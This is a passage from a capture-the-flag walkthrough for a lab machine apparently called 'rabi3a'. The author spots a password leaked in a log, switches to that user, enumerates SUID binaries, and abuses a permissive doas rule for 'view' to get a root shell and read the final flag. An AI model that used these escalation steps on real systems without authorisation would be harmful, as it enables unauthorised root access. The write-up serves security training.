Apr  5 21:14:59 rabi3a hamid: User root attempted SSH login from 134.84.195.69
Apr  5 21:14:59 rabi3a hamid: Authentication failure for user guest from 226.113.129.12
mysql: [Warning] Using a password on the command line interface can be insecure.
ERROR 1045 (28000): Access denied for user 'fakeuser'@'localhost' (using password: YES)
Failed SSH login for user admin
Apr  5 21:14:59 rabi3a hamid: User root attempted SSH login from 236.180.86.131
Apr  5 21:14:59 rabi3a hamid: Authentication failure for user guest from 195.234.68.101
mysql: [Warning] Using a password on the command line interface can be insecure.
ERROR 1045 (28000): Access denied for user 'fakeuser'@'localhost' (using password: YES)
.
.
Apr  5 21:15:01 rabi3a hamid: User root attempted SSH login from 110.229.84.70
Apr  5 21:15:01 rabi3a hamid: Authentication failure for user guest from 212.240.20.188
mysql: [Warning] Using a password on the command line interface can be insecure.
ERROR 1045 (28000): Access denied for user 'fakeuser'@'localhost' (using password: YES)
Failed SSH login for user admin
Apr 3 15:30:10 rabi3a mysql: Access denied for user 'hamid'@'localhost'  - Tried password: 3acha_Lmalik
Apr  5 21:15:14 rabi3a hamid: User root attempted SSH login from 44.219.228.214
Apr  5 21:15:14 rabi3a hamid: Authentication failure for user guest from 73.4.229.190
mysql: [Warning] Using a password on the command line interface can be insecure.
ERROR 1045 (28000): Access denied for user 'fakeuser'@'localhost' (using password: YES)
Failed SSH login for user admin
Apr  5 21:15:14 rabi3a hamid: User root attempted SSH login from 91.174.118.16
Apr  5 21:15:14 rabi3a hamid: Authentication failure for user guest from 190.98.121.12
mysql: [Warning] Using a password on the command line interface can be insecure.
ERROR 1045 (28000): Access denied for user 'fakeuser'@'localhost' (using password: YES)
Failed SSH login for user admin
Apr  5 21:15:14 rabi3a hamid: User root attempted SSH login from 91.202.37.57
Apr  5 21:15:14 rabi3a hamid: Authentication failure for user guest from 51.128.248.97
mysql: [Warning] Using a password on the command line interface can be insecure.
ERROR 1045 (28000): Access denied for user 'fakeuser'@'localhost' (using password: YES)
Failed SSH login for user admin
Apr  5 21:15:14 rabi3a hamid: User root attempted SSH login from 48.57.72.206
Apr  5 21:15:14 rabi3a hamid: Authentication failure for user guest from 27.35.44.62
mysql: [Warning] Using a password on the command line interface can be insecure.
ERROR 1045 (28000): Access denied for user 'fakeuser'@'localhost' (using password: YES)
Failed SSH login for user admin
```

the logs were full with fake login attempts but there is one line different then the others 

the user "hamid" tried logging in to mysql using the password "3acha_Lmalik"

this might be his password let's try it 

```terminal
da3li@rabi3a:/var/log$ su hamid
Password: 
hamid@rabi3a:/var/log$ id
uid=1003(hamid) gid=1003(hamid) groups=1003(hamid)
hamid@rabi3a:/var/log$ cd /home/hamid/
hamid@rabi3a:~$ ls -la
total 32
drwxr-xr-x 4 hamid hamid 4096 Apr  6 22:50 .
drwxr-xr-x 5 root  root  4096 Apr  5 21:12 ..
-rw------- 1 hamid hamid    1 Apr  6 22:45 .bash_history
-rw-r--r-- 1 hamid hamid  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 hamid hamid 3771 Apr  4  2018 .bashrc
drwx------ 2 hamid hamid 4096 Apr  5 21:11 .cache
drwx------ 3 hamid hamid 4096 Apr  5 21:11 .gnupg
-rw-r--r-- 1 hamid hamid  807 Apr  4  2018 .profile
hamid@rabi3a:~$ cat .bash_history 

hamid@rabi3a:~$ sudo -l
[sudo] password for hamid: 
Sorry, user hamid may not run sudo on rabi3a.
hamid@rabi3a:~$ find / -type f -perm -4000 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/local/bin/doas
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/newuidmap
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/bin/ping
/bin/mount
/bin/umount
/bin/su
/bin/fusermount
````

the only unusual suid here is "/usr/local/bin/doas" 

doas is a minimalistic alternative to sudo for executing commands as another user (usually root) with fine-grained permissions.

let's read the config file and see what we can do with it 

```terminal
hamid@rabi3a:/$ cat /etc/doas.conf 
permit nopass hamid as root cmd view
```
we can use the command view with doas let's look at GTFOBins to see how we can get a shell with view

```terminal
Shell
It can be used to break out from restricted environments by spawning an interactive system shell.

view -c ':!/bin/sh'
```
let's use this 

```terminal
hamid@rabi3a:~$ doas view -c ':!/bin/bash'

root@rabi3a:/home/hamid# id
uid=0(root) gid=0(root) groups=0(root)
root@rabi3a:/home/hamid# 
root@rabi3a:/home/hamid# cd /root
root@rabi3a:~# ls -la
total 48
drwx------  6 root root 4096 Apr  7 15:51 .
drwxr-xr-x 24 root root 4096 Apr  5 18:24 ..
lrwxrwxrwx  1 root root    9 Apr  7 14:38 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r--  1 root root   34 Apr  6 20:53 .gitconfig
drwxr-xr-x  3 root root 4096 Apr  5 18:40 .local
-rw-------  1 root root  469 Apr  6 21:06 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Apr  5 18:33 .ssh
-rw-------  1 root root  559 Apr  7 15:51 .viminfo
drwx------  5 root root 4096 Apr  5 20:56 Maildir
drwxr-xr-x  4 root root 4096 Apr  5 20:59 OpenDoas
-rw-r--r--  1 root root   46 Apr  5 21:07 flag5.txt
root@rabi3a:~# cat flag5.txt 
RaBi3a{Bga3_Tawado3_Vrai_Khatina_Lphotoshop}

```

DONE!